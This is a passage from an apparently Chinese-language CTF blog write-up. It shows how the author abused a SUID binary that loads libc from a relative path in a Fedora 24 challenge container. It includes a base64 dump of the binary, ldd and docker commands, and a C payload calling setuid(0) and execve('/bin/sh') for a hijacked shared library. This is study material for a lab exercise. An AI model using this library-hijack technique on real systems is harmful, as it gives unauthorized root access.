+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> /usr/bin/hello -w 0</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt; hello_remote.b64 &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">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Aw4QFxsOEQESBgAAAi4BEQESBkAYl0IZAw46CzsLJxk/GQAAAwUAAhcDDjoLOwtJEwAABDQAAhcDDjoLOwtJEwAABQsBVRcAAAaJggEBk0IYEQEAAAeKggEAAhiRQhgAAAguABEBEgZAGJdCGQMOOgs7CycZPxkAAAkkAAMOPgsLCwAACg8ASRMAAAsWAEkTAw46CzsLAAAMJgBJEwAAACwAAAACAAAAAAAIAAAAAADAFAABAAAAACsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKUAAAAEAH0AAAABAQH7Dg0AAQEBAQAAAAEAAAEvbml4L3N0b3JlLzM2OHYxbGRkNnNyOHhiZzAyYTduYnByOWl2azd4Njc2LXppZy0wLjE0LjEvbGliL3ppZy9saWJjL2dsaWJjL3N5c2RlcHMveDg2XzY0AABzdGFydC0yLjMzLlMAAQAAAAAJAsAUAAEAAAAAAz4BAxAuQiM+TSQkdXYDEHRoAgEAAQF2AAAABABwAAAAAQEB+w4NAAEBAQEAAAABAAABL25peC9zdG9yZS8zNjh2MWxkZDZzcjh4YmcwMmE3bmJwcjlpdms3eDY3Ni16aWctMC4xNC4xL2xpYi96aWcvbGliYy9nbGliYy9jc3UAAGFiaS1ub3RlLlMAAQAAAHIAAAAEAGwAAAABAQH7Dg0AAQEBAQAAAAEAAAEvbml4L3N0b3JlLzM2OHYxbGRkNnNyOHhiZzAyYTduYnByOWl2azd4Njc2LXppZy0wLjE0LjEvbGliL3ppZy9saWJjL2dsaWJjL2NzdQAAaW5pdC5jAAEAAAA+AAAABAAfAAAAAQEB+w4NAAEBAQEAAAABAAABAGhlbGxvLmMAAAAAAAAJAvAUAAEAAAAAFAUFCuXXBgsuAgYAAQEfAQAABADRAAAAAQEB+w4NAAEBAQEAAAABAAABL25peC9zdG9yZS8zNjh2MWxkZDZzcjh4YmcwMmE3bmJwcjlpdms3eDY3Ni16aWctMC4xNC4xL2xpYi96aWcvbGliYy9nbGliYy9jc3UAL25peC9zdG9yZS8zNjh2MWxkZDZzcjh4YmcwMmE3bmJwcjlpdms3eDY3Ni16aWctMC4xNC4xL2xpYi96aWcvaW5jbHVkZQAAZWxmLWluaXQtMi4zMy5jAAEAAF9fc3RkZGVmX3NpemVfdC5oAAIA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</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="built_in">base64</span> -d hello_remote.b64 &gt; hello_remote</span><br><span class="line">strace ./hello_remote</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/achieve/2025/8/LinuxAmd64%E4%B8%ADsuid%E4%BD%8D%E5%AE%9E%E7%8E%B0%E6%8F%90%E6%9D%83/QQ20250803-191137.jpg" alt="1"></p>
+<p>这里使用相对路径加载库文件，准备劫持so文件，把远程的so文件拉下来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sh-4.3$ ldd /usr/bin/hello</span><br><span class="line">        linux-vdso.so.1 (0x00007f193d78a000)</span><br><span class="line">        libc.so.6 =&gt; //usr/bin/../lib64/libc.so.6 (0x00007f193d03d000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007f193d400000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> 98058121e919 <span class="built_in">readlink</span> -f //usr/bin/../lib64/libc.so.6</span><br><span class="line">docker <span class="built_in">cp</span> 98058121e919:/usr/lib64/libc-2.23.so ./libc_real.so.6</span><br></pre></td></tr></table></figure>
+
+<p>编译成so文件，传到对应目录</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">   setgid(<span class="number">0</span>);</span><br><span class="line">   execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>填进去，然后覆盖原来的so文件，运行hello即可，但是这个特性只有这个特定系统才能成功</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> --platform=linux/amd64 fedora:<span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chmod</span>=4755 hello /usr/bin/hello</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --<span class="built_in">chmod</span>=400 flag.txt /flag.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m ctfplayer</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/ctfplayer</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> ctfplayer</span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/bin/sh&quot;</span>]</span></span><br></pre></td></tr></table></figure>
+
+<p>我本地都成功不了，只有远程才行。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这两提权应该是通用的，但是劫持so文件的设置很麻烦，所以我没弄，软链接的python我是成功了的</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechat.png" alt="baozongwi reward">
+        <span>reward</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>baozongwi
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://baozongwi.xyz/posts/25610.html" title="LinuxAmd64中suid位实现提权">https://baozongwi.xyz/posts/25610.html</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E5%A7%BF%E5%8A%BF/" rel="tag"># 姿势</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/15226.html" rel="prev" title="CCF2025">
+                  <i class="fa fa-angle-left"></i> CCF2025
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/posts/32931.html" rel="next" title="Dest0g3 520迎新赛">
+                  Dest0g3 520迎新赛 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">baozongwi</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Word count total">3.1m</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">87:21</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
